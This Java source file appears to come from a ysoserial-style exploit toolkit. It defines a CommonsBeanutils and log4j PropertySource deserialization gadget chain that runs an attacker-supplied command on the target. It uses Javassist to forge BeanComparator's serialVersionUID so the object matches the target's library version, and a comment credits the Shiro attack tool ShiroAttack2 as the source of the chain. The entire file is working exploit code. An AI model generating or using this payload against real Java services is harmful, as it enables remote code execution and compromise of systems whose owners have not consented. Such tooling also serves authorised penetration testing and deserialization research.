package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.utils.PayloadRunner;
import javassist.ClassClassPath;
import javassist.CtClass;
import javassist.CtField;
import org.apache.logging.log4j.util.PropertySource;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.Reflections;
import com.h2tg.ysogate.utils.SuClassLoader;

import java.util.Comparator;
import java.util.PriorityQueue;

import static com.h2tg.ysogate.config.Config.POOL;

/**
 * * 从 https://github.com/SummerSec/ShiroAttack2/ 中抄来的链子
 *
 * @author su18
 */
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "org.apache.logging.log4j:log4j-core:2.17.1"})
@Authors({"SummerSec"})
public class CommonsBeanutilsPropertySource183 implements CommandObjectPayload<Object>
{

	@Override
	public Object getObject(String command) throws Exception {

		final Object template = Gadgets.createTemplates4Cmd(command);
		PropertySource propertySource1 = new PropertySource() {
			@Override
			public int getPriority() {
				return 0;
			}
		};

		POOL.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
		final CtClass ctBeanComparator = POOL.get("org.apache.commons.beanutils.BeanComparator");
		try {
			CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
			ctBeanComparator.removeField(ctSUID);
		} catch (javassist.NotFoundException e) {
		}

//		ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
		ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -2044202215314119608L;", ctBeanComparator));

		final Comparator beanComparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
		ctBeanComparator.defrost();
		Reflections.setFieldValue(beanComparator, "comparator", new PropertySource.Comparator());


		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<? super Object>) beanComparator);

		queue.add(propertySource1);
		queue.add(propertySource1);

		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
		Reflections.setFieldValue(beanComparator, "property", "outputProperties");

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutilsPropertySource183.class, args);
	}
}
